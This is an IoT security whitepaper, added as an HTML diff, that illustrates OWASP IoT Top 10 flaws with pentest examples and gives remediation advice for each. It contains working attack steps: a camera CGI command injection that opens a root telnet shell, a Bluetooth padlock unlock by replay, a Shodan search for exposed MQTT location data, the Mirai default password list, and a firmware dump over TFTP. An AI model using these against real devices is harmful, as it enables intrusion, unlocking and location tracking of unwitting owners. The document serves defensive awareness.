@@ -1,0 +1,600 @@
+<html><head>
+        <meta charset="UTF-8">
+        
+      </head>
+      <body> <div class="report-sidebar"><p>Whitepaper - IoT : Attacker point of view - Arnaud COURTY - @vulcainreo
+</p></div><div class="title"><h1>IoT, attackers point of view</h1><h2>Whitepaper</h2></div><div class="ui segment piled" style="margin-bottom:0.6cm;"><div class="content"><h3>Abstract</h3>
+<p>This presentation will be an opportunity to review the most famous vulnerabilities encountered during pentest and audit. From industrials systems to the customer product, many security concepts are similar but often poorly implemented. From a standalone industrial system on which an IP address has been added, to the TV / connected toy that spies unbeknownst a household, any security issue quickly takes a new size as soon as the object is available on the market and connectd to the cloud. The purpose of this whitepaper is to provide to designers, developers and integrators of IoT solutions an overview of needed security reflex to include best practices from the design step.</p>
+</div></div><div class="ui icon message yellow" style="margin-bottom:0.6cm;"><i class="briefcase icon"></i><div class="content"><div class="header">About the author (Arnaud COURTY)</div><p>Researcher in IT Security at Onepoint, his main mission is to evangelise companies to take care about security from the design step.</p>
+<p>He works on internal and external offensive security analysis and assessment of security maturity of embedded systems upstream their industrialization.</p>
+<p>Since the beginning of IoT, Arnaud specializes himself in vulnerabilities research adapted to the embedded systems but also awareness of designers, developers and integrators. He takes advantage of security events and working groups to campaign for a less vulnerable IoT world.</p>
+</div></div><h1>Connected object of Internet of things ?</h1>
+<p>An object is by definition a solid thing that responds to a specific and predefined function. Here, in everyday language, an object is often a sensor (temperature or pressure) or an actuator (valve or relay). The connected dimension comes from the addition of an IP adress (IPv4 or IPv6).</p>
+<p>The following schema shows this explained defition :</p>
+<p><img src="./img/schemaIoT.png" alt="./img/schemaIoT.png"></p>
+<p>In some situation, the sensor needs to be miniaturized in order to be transported (ex.: heart rate sensor). This new usage brings new constraints such as size and autonomy. We will see later that some of them are responsable to security weakness mostly covered by the Top10 OWASP.</p>
+<p>In addition to theses constraints, we can add the time to market process where a single week late will train a disastrous impact on sales.</p>
+<p>In order to well manage theses size and autonomy issues, the objects (or sensors) are mostly no able to contact directly the cloud. Indeed, a middleware is often put between them and could be an Android or an iOS smartphone application.</p>
+<h1>Standard reminders</h1>
+<p>In IoT world, there is no standards that could become a norm. Indeed, many companies have imposed their communication protocol. Some of them, after time and partnership, becomes references but not norms.</p>
+<p>Today, we could classify standards in eight categories. Only famous of them will be describe bellow.</p>
+<ul>
+<li>Infrastructure
+<ul>
+<li>IP / nanoIP : like Internet network</li>
+<li>Time Synchronized Mesh Protocole (TSMP) : self-organized network where communication is done by time windows.</li>
+</ul>
+</li>
+<li>Identification</li>
+<li>Communication and transport</li>
+<li>Discovery</li>
+<li>Data transport</li>
+<li>Device management</li>
+<li>Semantic</li>
+<li>Multi-layer framework.</li>
+</ul>
+<h2>MQTT (Message Queue Telemetry Transport)</h2>
+<p>This light protocol is designed to send data from sensor to whatever application. Data transfert is done with topic subscribing.</p>
+<h2>DDS (Data Distribution Service)</h2>
+<p>This protocol is designed for machine to machine communications.</p>
+<h2>AMQP (Advanced Message Queuing Protocol)</h2>
+<p>This protocol is designed to intermediate environments. There is a sending and reception queue for messages exchange.</p>
+<h2>Bluetooth</h2>
+<ul>
+<li>Standard: Bluetooth 4.2</li>
+<li>Frequency: 2.4GHz</li>
+<li>Range: 50-150m (Smart/BLE)</li>
+<li>Rate: 1Mbps (Smart/BLE)</li>
+</ul>
+<h2>Zigbee</h2>
+<ul>
+<li>Standard: ZigBee 3.0 based on IEEE802.15.4</li>
+<li>Frequency: 2.4GHz</li>
+<li>Range: 10-100m</li>
+<li>Rate: 250kbps</li>
+</ul>
+<h2>Wifi</h2>
+<ul>
+<li>Standard: Based on IEEE 802.11</li>
+<li>Frquency: 2.4GHz and 5GHz bands</li>
+<li>Range: Approximately 50m</li>
+<li>Rate: 150-200Mbps, 600 Mbps maximum</li>
+</ul>
+<h2>Cellulaire</h2>
+<ul>
+<li>Standard: GSM/GPRS/EDGE (2G), UMTS/HSPA (3G), LTE (4G)</li>
+<li>Frequency: 900/1800/1900/2100MHz</li>
+<li>Range: 35km (GSM); 200km (HSPA)</li>
+<li>Rate: 35-170kps (GPRS), 120-384kbps (EDGE), 384Kbps-2Mbps (UMTS), 600kbps-10Mbps (HSPA), 3-10Mbps (LTE)</li>
+</ul>
+<h2>LoraWAN (Long Range Wide Area Network)</h2>
+<ul>
+<li>Standard: LoRaWAN</li>
+<li>Frequence: Various</li>
+<li>Range: 2-5km (urban area), 15km (suburban area)</li>
+<li>Rate: 0.3-50 kbps</li>
+</ul>
+<h2>Sigfox</h2>
+<ul>
+<li>Standard: Sigfox</li>
+<li>Frequency: 900MHz</li>
+<li>Range: 30-50km (rural environments), 3-10km (urban environments)</li>
+<li>Rate: 10-1000bps</li>
+</ul>
+<h2>NFC (Near Field Communication)</h2>
+<ul>
+<li>Standard: ISO/IEC 18000-3</li>
+<li>Frequency: 13.56MHz (ISM)</li>
+<li>Range: 10cm</li>
+<li>Rate: 100–420kbps</li>
+</ul>
+<h1>IoT security : a paradigm shift</h1>
+<p>Iot security is fully conforms to safety standard:</p>
+<ul>
+<li><strong>Privacy</strong> : the goal is to be sure that only authorized people / programs could access to information</li>
+<li><strong>Integrity</strong>: the goal is to be sure that information can't be modified and all alteration could be detected.</li>
+<li><strong>Avalaibility</strong>: the goal is to be sure that a system is available and usable by authorized user</li>
+<li><strong>Traceability</strong>: the goal is to be sure that all actions are logged and irreproachable.</li>
+</ul>
+<p>Added to theses standards, authentication has a goal to prove the user / programm identity.</p>
+<p>Moreover, new issue takes place on the agenda. The embedded systems can be manipulated by the user, bought in several copies and be totally disassembled with a study time almost infinite.
+An attacker could be able to deep analyze the object with costly resource like laser chip cutting and side channels attacks.</p>
+<h1>Attack surface</h1>
+<p>Over the entire data blockchain, an attacker will focus his actions on the weakness link.</p>
+<p>In the following schema, an attacker could compriomized the smartwatch and listen transaction between bracelet and middleware. On the smartphone, he could extract sensitive information and inject malicious content to the bracelet. On the cloud connection, an attacker could listen traffic and attack all exposed interface.</p>
+<p><img src="./img/schemaDangerIoT.png" alt="./img/schemaDangerIoT.png"></p>
+<p>In summary, a connected object exposes a huge suface from which each centimeters could become a attack vector. The following mindmap shows some of them.</p>
+<p><img src="./img/attackSurface.png" alt="./img/attackSurface.png"></p>
+<h1>The IoT Top10 OWASP</h1>
+<p>OWASP (Open Web Application Security Projet) is an online community who works on security and webapp security. The main goal is to provide best practices and security guides. Since a few time, IoT takes place on the OWASP website <a href="%5Bhttps://www.owasp.org/index.php/OWASP_Embedded_Application_Security">https://www.owasp.org/index.php/OWASP_Embedded_Application_Security</a></p>
+<p>Remember, a connected object has theses following constraints :</p>
+<ul>
+<li>Cost : the object must be the less expensive</li>
+<li>Size : the object must stay small and light</li>
+<li>Performance : the object must be available and reliable</li>
+<li>Autonomy : the object must be able to operate at least 24 hours</li>
+</ul>
+<p>These constraints, added to a very fast time to market, leads to a non-compliance of the entire V-cycle (agility is not a commonplace)</p>
+<h2>TOP 1 : Insecure Web interface</h2>
+<p>The first position is attributed to the discover of vulnerabilities in the Web interface. Here, the impact is more important than other because these interfaces are directly interacting with the user (or attacker of course).</p>
+<p>In this example, a security camera, connected to the local network, broadcast a web interface on the port 80.
+The webserver is composed of CGI files, allowing display of web content, retrieval of the users requests (ex.: camera moving, take photo or alert configuration) and then, data transmission to internal drivers (ex.: motors and config files).</p>
+<p>Here, a remote code execution vulnerability allows an attacker to modify the camera behavior. The root cause is the FTP configuration process where the password field doesn't handle correctly user input. An attacker could inject a bash command like <strong>ftp connect</strong> in order to be executed directly on the device.</p>
+<pre class="hljs"><code>http://192.168.1.107/setftp.cgi[...]]ser=ftp&amp;<span class="hljs-built_in">pwd</span>=$(ftp test.test)ftp&amp;dir=/
+http://192.168.1.107/ftptest.cgi[...]inpas=admin
+</code></pre><p>On the camera, when the firmware process given information, it execute the bash <strong>ftp connect</strong> command. A TCPdump allow an attacker to see the connection attempt (DNS request) - the exploit is successfully executed on the device.</p>
+<pre class="hljs"><code>00:00:00.151107 IP 192.168.10.10.33551 &gt; 8.8.8.8.53: test.test. (23)
+</code></pre><p>An attacker will be able to start a telnet connection on the port 25 and connect to it.</p>
+<pre class="hljs"><code>user@kali$ wget -qO- 
+  <span class="hljs-string">'http://192.168.1.107/set_ftp.cgi[...]pwd=$(telnetd -p25 -l/bin/sh)&amp;dir=/'</span>
+user@kali$ wget -qO- <span class="hljs-string">'http://192.168.1.107/ftptest.cgi[...]loginpas=admin'</span>
+
+
+user@kali$ user@kali$ telnet 192.168.1.107 25
+Trying 192.168.1.107...
+Connected to 192.168.1.107.
+Escape character is <span class="hljs-string">'^]'</span>.
+
+<span class="hljs-comment">#&gt; id</span>
+uid=0(root) gid=0telnet 192.168.1.107 25
+Trying 192.168.1.107...
+Connected to 192.168.1.107.
+Escape character is <span class="hljs-string">'^]'</span>.
+
+<span class="hljs-comment">#&gt; id</span>
+uid=0(root) gid=0
+</code></pre><div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to sanitize all user input before processing. More generally, data could be corrupted. A developer could use regular expression of predefined choices to limit attacker injection.</p>
+</div></div><h2>TOP 2 : Insecure authenfication and authorisation</h2>
+<p>The second step goes to weakness in the authentication process. Here, after a firmware decompilation, an attacker could extract the login source code. The following screenshot shows the bytecode. An attacker could easily identify weakness like incorrect password validation and looping exit condition.</p>
+<pre class="hljs"><code>boolean verifyPIN ( byte [] inputPIN )
+{
+	<span class="hljs-keyword">for</span> (int i=0; i&lt;correctPIN.length; i++)
+		<span class="hljs-keyword">if</span> ( inputPIN [i] != correctPIN [i] )
+			<span class="hljs-built_in">return</span> <span class="hljs-literal">false</span> ;
+	<span class="hljs-built_in">return</span> <span class="hljs-literal">true</span> ;
+}
+</code></pre><p>The attack is almost simple : just analyse the answering timing. If the first character is wrong, the loop will exit shortly. An attacker could enumerate each character in each position to identify if the character is correct or not. Just replaying the same method on other position in order to detect which caracter is correct. The new complexity will be only to 40 try.</p>
+<div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is recommended to not reinvent a validation algorithm. Using community algorithm should be a relevant solution, mostly because the commmunity has already hardened the security. By the way, a password should never stored in cleartext but in a non-reversible method (ex.: hashed with sha256)</p>
+</div></div><h2>TOP 3 : Insecure network services</h2>
+<p>Some object broadcasts streams without any upstream control. Here, an IP camera connected to the local network broadcast, without authentication, a RSTP video stream on the port 10554.</p>
+<p>The VLC tool allows an attacker to decode in live the stream.</p>
+<pre class="hljs"><code>user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_1
+</code></pre><p><img src="./img/officeCam.png" alt="./img/officeCam.png"></p>
+<div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to limit to the strict minimum broadcast of unnecessary services and validate the user identication before streaming. Here, the developper could include an authentication at the stream opening (ex.: admin:admin@ip:10554/stream). By the way, the stream should be always encrypted.</p>
+</div></div><h2>TOP 4 : Encrptyed communication</h2>
+<p>In the case of external communications (nearfield, long range, low speed or high speed), some informations are exchanged without protection : especially in confidentiality. Here, an attacker could freely listen a Bluetooth exchange over the air from a smartphone to a padlock.</p>
+<p>In the following screenshot, an attacker could retrieve device Bluetooth characteristic (Bluetooth services). After analysis, espaciall with Bluetooth logging (hci) on an Android smartphone, an attacker could easily describe each characteristics.</p>
+<ul>
+<li>The 0x0026 caracteristic is responsible to padlock notification</li>
+<li>The 0x0029 caracteristic is responsible to padlock opening request</li>
+</ul>
+<pre class="hljs"><code>Smartphone &gt; Padlock : 0x0026 0100
+Smartphone &gt; Padlock : 0x0029 554100000014
+Smartphone &gt; Padlock : 0x0029 55100144
+</code></pre><p>With a simple replay of previous command, an attacker could open the padlock.</p>
+<pre class="hljs"><code>[34:XX:13:XX:5C:XX][LE]&gt; connect 34:XX:13:XX:5C:XX
+		Attempting to connect to 34:XX:13:XX:5C:XX
+		Connection successful
+[34:XX:13:XX:5C:XX][LE]&gt; char-write-cmd 0x0026 0100
+[34:XX:13:XX:5C:XX][LE]&gt; char-write-cmd 0x0029 554100000014
+[34:XX:13:XX:5C:XX][LE]&gt; char-write-cmd 0x0029 55100144
+		Padlock unlocked
+
+</code></pre><div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to setup a unique challenge during each exchange. A developer could implement a sharing secret between smartphone and padlock. In each opening request, a random number is calculated by the smartphone and crypted by the shared secret before sending to the padlock. This random secret guaranteed the uniqueness of the session.</p>
+</div></div><h2>TOP 5 : Sensitive information exposure</h2>
+<p>Some applications and protocols are often implemented and used without taking care of the security layer. Here a smartphone application publishs on a MQTT server the location of his proprietary.</p>
+<p>This application goal is to share, between friends, each people location. The location is published and stored on a dedicated MQTT broker.
+The MQTT protocol allows, by default, anybody to subscribe to the broacasted topic, without any authentication. A simple Shodan request with the application name allow an attacker to identify vulnerable server and access to smartphone geolocation.</p>
+<pre class="hljs"><code>shodan search o[xxx]ks --fields ip_str --<span class="hljs-built_in">limit</span> 1
+
+XX1.2XX.2XX.1X9
+</code></pre><p>Shodan automatically lists available topic published on the broker. Here, Brian smartphone publishs his user's location.</p>
+<pre class="hljs"><code>smartthings/bed/level
+smartthings/bed/switch
+tele/sonoff_bedroom/LWT
+tele/sonoff_livingroom/LWT
+o[xxx]s/brian/iphone
+</code></pre><p>The following screenshot shows an attacker who has subscribed to the Brian location topic /o[xxx]s/brian/iphone and see that he is currently in Norway.</p>
+<pre class="hljs"><code>{
+  <span class="hljs-attr">"cog"</span>: <span class="hljs-number">286</span>,
+  <span class="hljs-attr">"batt"</span>: <span class="hljs-number">49</span>,
+  <span class="hljs-attr">"lon"</span>: <span class="hljs-number">12345678</span>,
+  <span class="hljs-attr">"acc"</span>: <span class="hljs-number">16</span>,
+  <span class="hljs-attr">"p"</span>: <span class="hljs-number">99.99998474121094</span>,
+  <span class="hljs-attr">"vel"</span>: <span class="hljs-number">53</span>,
+  <span class="hljs-attr">"vac"</span>: <span class="hljs-number">14</span>,
+  <span class="hljs-attr">"lat"</span>: <span class="hljs-number">12345678</span>,
+  <span class="hljs-attr">"conn"</span>: <span class="hljs-string">"m"</span>,
+  <span class="hljs-attr">"tst"</span>: <span class="hljs-number">1534968426</span>,
+  <span class="hljs-attr">"tid"</span>: <span class="hljs-string">"NE"</span>,
+  <span class="hljs-attr">"_type"</span>: <span class="hljs-string">"location"</span>,
+  <span class="hljs-attr">"alt"</span>: <span class="hljs-number">27</span>
+}
+
+</code></pre><div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to check that free services do not abusively expose information on the Internet and an authentication process is implemented. The authentication process must validate user identity and limit access to only legitimate users. Some details could be find here :  <a href="https://www.hivemq.com/blog/introducing-the-mqtt-security-fundamentals">https://www.hivemq.com/blog/introducing-the-mqtt-security-fundamentals</a></p>
+</div></div><h2>I6 : Insecure cloud services</h2>
+<p>Some IoT builders wants to simplify the user's story as much as possible. Thus, in the case of VIPCAM camera, a subdomain is booked for each camera. User should only plug the camera, take his browser, point to the printed subdomain and access to the camera. If it is simple for a user, it will be also the same for an attacker.</p>
+<p>An attacker, without buying the camera, could identify the subdomain name generation algorithm. Indeed, all marketplaces publish promotional pictures :</p>
+<p><img src="./img/vipcam.png" alt="Site marchand 1">
+<img src="./img/vipcam2.jpg" alt="site marchand 2">
+<img src="./img/vipcam3.png" alt="site marchand 3"></p>
+<div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to put the camera behind a well configured firewall. If the user wants to connect from Internet, a VPN or SSH tunneling should be implemented to secure the exchange. It's cool to simplify the user experience but if the connection is setup on only two steps (ex.: power up the device and flash a QRcode), an attacker will be also connected with only two mouse clics.</p>
+</div></div><h2>I7 : Insecure mobile interface</h2>
+<p>Some public transport companies wants to be the first to deploy innovations like nearfield payments. Here, the companie deploys on the marketplace a smartphone application to buy and simulate a ticket from the smartphone. Using a decompilation tool like JADX, an attacker could read the bytecode. In this example, the bytecode isn't obfuscated and clearly readable.</p>
+<pre class="hljs"><code>jadx-gui com.app.apk
+</code></pre><p>A nearfield contactess card (NFC card) and a reader exchange information with command and response. This exchange is called APDU. Because the bytecode isn't obfuscated, an attacker could easily reverse enginer the all exchange schema :</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XXXXXXXInstance</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">CardInstance</span> </span>{
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String XXXX_AID = <span class="hljs-string">"A000XXXXXXXXXXXXXXXXXXXXXA59XXXX0000"</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String XXXX_SELECT_BY_AID = (<span class="hljs-string">"00A40400"</span> + XXXX_AID);
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> deltaTimeMillisTokenExp = TimeUnit.DAYS.toMillis(<span class="hljs-number">10</span>);
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String CONTRACT = <span class="hljs-string">"XX"</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String CONTRACT_EXT = <span class="hljs-string">"XX"</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String CONTRACT_LIST_LID = <span class="hljs-string">"XX"</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String READ_COUNTER = <span class="hljs-string">"9XX2"</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> String SPECIAL_EVENT_LID = <span class="hljs-string">"XX"</span>;
+
+String contract_list = HMPUtils.hexStringToBinaryString(HMPAdvancedFunc.executeAPDU(<span class="hljs-string">"00"</span>)
+	infoElements.add(<span class="hljs-keyword">new</span> InfoElement(<span class="hljs-string">"eventRouteNumber"</span>,
+	HMPUtils.getElementFromBinaryString(journalTransport, index, <span class="hljs-number">16</span>)));
+</code></pre><p>From these information, an attacker could easily craft a custom pirate application in order to say Yes to all reader command.</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XXXXXXXInstance</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">CardInstance</span> </span>{
+	<span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String XXXX_AID = <span class="hljs-string">"A000XXXXXXXXXXXXXXXXXXXXXA59XXXX0000"</span>;
+			
+	<span class="hljs-keyword">if</span> (reader.request == <span class="hljs-string">"XXXXXX"</span>) {
+			sendAPDU(XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX)
+				....				
+
+</code></pre><div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to protect all secrets during runtime and storage. Theses informations should never be easily accessed by an attacker, especially with label. When all information are protected and bytecode obfuscated, there are some tools and custom hardware to retreive exchange (like Proxmark3). An attacker must put his tool between a real reader and his custom application. The bus-driver or securiy camera should detect and companie percecute the attacker.</p>
+</div></div><h2>I8 : Insecure configuration</h2>
+<p>By default, the device configuration is set with a well-known password. An attacker could try a successfully connection with a little dictionnary. Here, we will focus on Mirai virus. As a reminder, this virus infects security camera because of adminstrators (or users) never modify default password. The following screenshot shows the default password dictonnary embedded in the virus bytecode.</p>
+<pre class="hljs"><code>cat mirai_creds.txt
+
+root:xc3511
+root:vizxv
+root:admin
+admin:admin
+root:888888
+root:xmhdipc
+root:default
+root:juantech
+root:123456
+root:54321
+support:support
+</code></pre><p>A linked vulnerability (could be named also backdoor), is that the device firmware is run in readonly mode. An administrator couldn't modify the root password with a secure one. The following screenshot shows that the device refused to modify the root password. Moreover, unsecured telnet connection is the fast way to administrate the device.</p>
+<pre class="hljs"><code>$ telnet X.X.X.X
+Trying X.X.X.X...
+Connected to X.X.X.X.
+Escape character is <span class="hljs-string">'^]'</span>.
+LocalHost login: root
+Password:
+Welcome to a Poor Security Cam :)
+<span class="hljs-comment"># passwd</span>
+-sh: passwd: not found
+<span class="hljs-comment"># cat /etc/passwd</span>
+root:<span class="hljs-variable">$1</span><span class="hljs-variable">$RYI</span>[...]JwGjRy.B0:0:0:root:/:/bin/sh
+<span class="hljs-comment"># touch /etc/passwd</span>
+touch: /etc/passwd: Read-only file system
+
+
+</code></pre><div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to consider best practices from the design stage. Leave a default password or a backdoor should clearly hurt the final user. The best practice is to set a custom random password and print it in the package. Don't try to force an enrollment of the user for retrieving root password like some Xiaomi routers. Don't ignore the user experience.</p>
+</div></div><h2>I9 : Insecure firmware and software.</h2>
+<p>From a simple research on the support website, an attacker could download the firmware and analyse it deeper. Binwalk tool allows, from an entropic analysis to list all detected filesystem and partition. In the following screenshot, a JFFS2 filesystem has been identified. The Jefferson tool (https://github.com/sviehb/jefferson) allows an attacker to extract all archive content.</p>
+<pre class="hljs"><code><span class="hljs-comment">#binwalk firmware.pkg</span>
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+144           0x90            JFFS2 filesystem, little endian
+
+<span class="hljs-comment">#jefferson firmware.pkg -d out</span>
+
+dumping fs <span class="hljs-comment">#1 to /out/fs_1</span>
+Jffs2_raw_dirent count: 684
+Jffs2_raw_inode count: 4728
+Jffs2_raw_summary count: 0
+Jffs2_raw_xattr count: 0
+Jffs2_raw_xref count: 0
+[...]
+</code></pre><p>The firmware is composed of a linux architecture (/etc/, /var/ and /bin/). The goal is to identify the hardcoded root password. Obviously, <strong>/etc/passwd</strong> and <strong>/etc/shadow</strong> should be the right way. The password is encrypted and could be easily cracked with the JohnTheRipper tool. A custom dictonnary like "rockyou" should be used, but in many IoT case, it is useless.</p>
+<pre class="hljs"><code>cat /etc/passwd
+root:<span class="hljs-variable">$1</span>$<span class="hljs-variable">$qRP</span>[...]by/:0:0::/root:/bin/sh
+
+john pass.txt --show
+		root:admin
+1 password <span class="hljs-built_in">hash</span> cracked, 0 left
+	</code></pre><p>An attacker sould now retreive usefull information like :</p>
+<ul>
+<li>Source code : ls -la /mnt/webapp/</li>
+<li>Startup scripts : find / -name *.sh</li>
+<li>Binaries : ls -la /bin/</li>
+</ul>
+<div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to implement in each publicly accessible firmware, a cryptographic protection. Please developpers, don't reinvent a custom implementation and reuse community source code.</p>
+</div></div><h2>I10 : Physical issues</h2>
+<p>In this chapter, the physical security will be analysed. Easy access to a debug port (like UART) allows an attacker to be prompted by a shell.
+At the device startup, the bootloader is launched. Trying escape, enter, q or space should stop the booting process and prompt a usefull shell.</p>
+<pre class="hljs"><code>Bootloader
+W90N745 Boot Loader [ Version 11.1 <span class="hljs-variable">$Revision</span>: 1 $ ] Rebuilt on Jun 19 2006
+Memory Size is 0x800000
+Bytes, Flash Size is 0x400000
+	</code></pre><p>From this shell, an attacker should list all available services : especially the TFTP process. This protocol allows to download the firmware from a server and put it directly in RAM. This is used in manufacture to download automatically the most recent firmware on the device before packaging.</p>
+<p>The TFTP tool has a download and also an upload function. After taking a boot shell, an attacker could setup a custom TFTP server and try to upload all memory to his server, byte per byte. The following screenshot shows the attack.</p>
+<pre class="hljs"><code>	<span class="hljs-comment">## TFTP server setup</span>
+	apt-get install tftp-hpa
+
+	<span class="hljs-comment">## TFTP listenner configuration on the attacker server</span>
+	TFTP_USERNAME=<span class="hljs-string">"tftp"</span>
+	TFTP_DIRECTORY=<span class="hljs-string">"/srv/tftp"</span>
+	TFTP_ADDRESS=<span class="hljs-string">"0.0.0.0:69"</span>
+	TFTP_OPTIONS=<span class="hljs-string">"-c -s"</span>
+
+	/etc/init.d/tftp-hpa restart
+
+	<span class="hljs-comment">## TFTP server configuration on the camera</span>
+	setenv ipaddr = xxx
+	setenv gatewayip = xxx
+	setenv serverip = xxxx
+
+	<span class="hljs-comment">## Firmware exporting, byte per byte</span>
+	sf probe 0
+	sf <span class="hljs-built_in">read</span> 0x82000000 0x40000 0x370000
+	tftp 0x82000000 romfs.cramfs 0x370000
+
+	hisilicon <span class="hljs-comment"># tftp 0x82000000 romfs.cramfs 0x370000</span>
+	Hisilicon ETH net controler
+	miiphy_register: non unique device name <span class="hljs-string">'0:1'</span>
+	miiphy_register: non unique device name <span class="hljs-string">'0:2'</span>
+	MAC:   00-XX-16-XX-21-XX
+	UP_PORT : phy status change : LINK=UP : DUPLEX=FULL : SPEED=100M
+	TFTP to server 192.168.0.11; our IP address is 192.168.0.10
+	Upload Filename <span class="hljs-string">'romfs.cramfs'</span>.
+	Upload from address: 0x82000000, 3.448 MB to be send ...
+	Uploading: <span class="hljs-comment">#    [ Connected ]</span>
+ 	&gt;&gt;&gt;&gt;&gt; 3.448 MB upload ok.
+</code></pre><p>The firmware is extracted in cleartext and should easily be analysed by previous described method (binwalk and JohnTheRipper)</p>
+<pre class="hljs"><code>$&gt;/srv/tftp<span class="hljs-comment"># binwalk firmware </span>
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+9440          0x24E0          LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: -1 bytes
+262144        0x40000         CramFS filesystem, little endian, size: 3510272 version 2 sorted_dirs CRC 0xE9959B5C, edition 0, 1313 blocks, 163 files
+...
+3785400       0x39C2B8        Zlib compressed data, default compression
+3785428       0x39C2D4        Zlib compressed data, default compression
+			
+
+dd <span class="hljs-keyword">if</span>=firmware of=boot bs=1 skip=9440 count=252704
+dd <span class="hljs-keyword">if</span>=firmware of=romfs bs=1 skip=3866624 count=2621440
+dd <span class="hljs-keyword">if</span>=firmware of=web bs=1 skip=6488064 count=1310720	
+...
+dd <span class="hljs-keyword">if</span>=firmware of=last bs=1 skip=8255636
+
+Strings
+root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+admin:x:9:9:news:/xxxxx:/bin/sh
+camera:x:10:10:uucp:/var/spxxxxxx:/bin/shfs
+							</code></pre><p>Another example is a Bluetooth light. The device use an Arduino Atmega328p chip to control light, color and Bluetooth communication with the smartphone application. The following screenshot shows the PCB. As we can see, USB labelled 3 pins should be a UART connection.</p>
+<p><img src="./img/pcb.png" alt="puce Atmega328p"></p>
+<p>A datasheet reading confirm that it is an UART connection</p>
+<p><img src="./img/atmegaDatasheet.png" alt="Atmega datasheet"></p>
+<p>The tool <strong>Avrdude</strong> is able to dump the Atmega328p content. The following screenshot shows the shell command.</p>
+<pre class="hljs"><code>avrdude -F -v -patmega328p -carduino -P/dev/tty/ACM0 -b115200 -D -Uflash:r:program.bin:r
+</code></pre><p>From a hexdump of the binary file, the source code is readable and hardcoded password could be retreived :</p>
+<p><img src="./img/getPwdFromCode.png" alt=""></p>
+<div class="ui icon message red" style="margin-bottom:0.6cm;"><i class="fire extinguisher icon"></i><div class="content"><p>It is highly recommended to limit physical access to the PCB and implement a fuse production process (debug port will be unsuable). Moreover, all firmware should be stored always encrypted. The decryption process will be done on the device, directly in memory.</p>
+</div></div><!--include testcode.pug--><template id="page-footer"><style type="text/css">.pdfheader {
+  font-size: 10px;
+  font-family: Poppins;
+  font-weight: bold;
+  width: 1000px;
+  border-top: 1px solid black;
+  margin-left: 10%;
+  margin-right: 10%;
+  padding-top: 1mm;
+  margin-bottom: -1mm;
+  text-align: center;
+}
+</style><div class="pdfheader">Page <span class="pageNumber"></span> / <span class="totalPages"></span></div></template><style>@import 'https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.1/semantic.min.css';
+@import 'https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.1/icon.min.css';
+@import 'https://afeld.github.io/emoji-css/emoji.css';
+@import url("https://fonts.googleapis.com/css?family=Poppins");
+@import 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css';
+@page {
+  margin: 2cm 1cm 2cm 0cm; }
+
+html {
+  padding-left: 1cm;
+  padding-right: 1cm;
+  font-family: 'Poppins', sans-serif;
+  font-size: 16px !important; }
+
+h1 {
+  font-size: 3em;
+  margin-bottom: 30; }
+
+h2 {
+  font-size: 2em;
+  margin-left: 30;
+  margin-top: 30; }
+
+.title {
+  text-align: center;
+  margin-bottom: 3em; }
+  .title h1 {
+    font-size: 3em;
+    margin-bottom: 0; }
+  .title h2 {
+    margin-top: 0.1em;
+    font-size: 1.8em; }
+
+body {
+  line-height: 1.5em;
+  font-size: 16px !important;
+  text-align: justify;
+  font-family: 'Poppins', sans-serif;
+  margin-left: 1cm; }
+
+a {
+  text-decoration: underline;
+  color: inherit; }
+
+.report-sidebar {
+  position: fixed;
+  left: -0.4in;
+  top: -100;
+  width: 0.4in;
+  height: 1450px;
+  writing-mode: vertical-rl;
+  border-top: 0.4in solid transparent;
+  border-left: 0.4in solid #2468a2;
+  border-bottom: 0.4in solid transparent; }
+  .report-sidebar p {
+    text-align: center;
+    color: #a7cceb;
+    margin-right: 0.1in; }
+
+.block-center {
+  display: block;
+  margin: 0 auto; }
+
+.figure p {
+  font-size: 0.7em !important;
+  margin-top: 1em; }
+
+h1 {
+  page-break-before: always;
+  text-align: center; }
+
+hr {
+  border: 0;
+  height: 1px;
+  background: #333;
+  background-image: linear-gradient(to right, #ccc, #333, #ccc); }
+
+.full-width {
+  width: 100%; }
+
+.two-column {
+  column-count: 2;
